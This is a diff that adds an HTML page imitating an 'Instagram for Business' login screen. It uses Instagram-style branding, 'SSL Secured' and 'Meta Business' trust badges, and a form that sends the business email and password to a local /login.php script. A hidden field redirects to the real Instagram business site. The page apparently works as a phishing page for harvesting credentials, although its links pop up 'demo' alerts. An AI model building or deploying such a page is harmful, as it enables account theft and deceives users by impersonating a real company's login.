@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram for Business</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 440px;
+            width: 100%;
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 40px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            font-size: 38px;
+            font-weight: 300;
+            margin-bottom: 5px;
+            background: linear-gradient(45deg, #f09433, #dd2a7b, #515bd4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .logo p {
+            color: #8e8e8e;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        
+        .badge {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .badge span {
+            background: #0095f6;
+            color: white;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 6px 12px;
+            border-radius: 8px;
+            letter-spacing: 0.5px;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card label {
+            color: #262626;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+        
+        .card input {
+            height: 44px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+            padding: 0 12px;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background: white;
+        }
+        
+        .card input::placeholder {
+            color: #8e8e8e;
+        }
+        
+        .card button {
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+            height: 44px;
+            cursor: pointer;
+            margin: 8px 0 16px;
+            transition: background 0.2s;
+        }
+        
+        .card button:hover {
+            background: #1877f2;
+        }
+        
+        .forgot-row {
+            display: flex;
+            justify-content: flex-end;
+            margin: 5px 0 15px;
+        }
+        
+        .forgot-row a {
+            color: #0095f6;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        
+        .forgot-row a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            font-size: 12px;
+            margin: 20px 0;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .divider::before {
+            margin-right: 12px;
+        }
+        
+        .divider::after {
+            margin-left: 12px;
+        }
+        
+        .business-features {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #262626;
+        }
+        
+        .business-features h3 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #0095f6;
+        }
+        
+        .business-features ul {
+            list-style: none;
+        }
+        
+        .business-features li {
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .create-link {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #262626;
+        }
+        
+        .create-link a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .create-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 11px;
+            color: #8e8e8e;
+        }
+        
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            color: #262626;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin: 20px 0 0;
+            font-size: 11px;
+            color: #8e8e8e;
+            padding-top: 20px;
+            border-top: 1px solid #dbdbdb;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>Instagram</h1>
+            <p>for Business</p>
+        </div>
+        
+        <div class="badge">
+            <span>Professional Account</span>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://business.instagram.com/login">
+                
+                <label for="email">Business email</label>
+                <input type="email" id="email" name="email" placeholder="Enter your business email" required autofocus>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                
+                <div class="forgot-row">
+                    <a href="#" onclick="alert('Forgot password demo'); return false;">Forgot business password?</a>
+                </div>
+                
+                <button type="submit">Log in to Business Suite</button>
+            </form>
+            
+            <div class="business-features">
+                <h3>Business Tools</h3>
+                <ul>
+                    <li>📊 Analytics & Insights</li>
+                    <li>📅 Post Scheduler</li>
+                    <li>💬 Message Inbox</li>
+                    <li>📈 Ad Manager</li>
+                </ul>
+            </div>
+            
+            <div class="divider">or</div>
+            
+            <div class="create-link">
+                <a href="#" onclick="alert('Create business account demo'); return false;">Create a business account</a>
+            </div>
+            
+            <div class="security-note">
+                <span>🔒</span>
+                <span>SSL Secured</span>
+                <span>•</span>
+                <span>Meta Business</span>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
+            <a href="#" onclick="alert('Business Support demo'); return false;">Business Support</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                e.preventDefault();
+                alert('Please enter your business email and password');
+                return;
+            }
+            
+            if (!email.includes('@')) {
+                e.preventDefault();
+                alert('Please enter a valid email address');
+                return;
+            }
+        });
+        
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#0095f6';
+                this.style.background = 'white';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#dbdbdb';
+                    this.style.background = '#fafafa';
+                }
+            });
+        });
+        
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        
+        window.addEventListener('load', function() {
+            document.getElementById('email').focus();
+        });
+    </script>
+</body>
+</html>
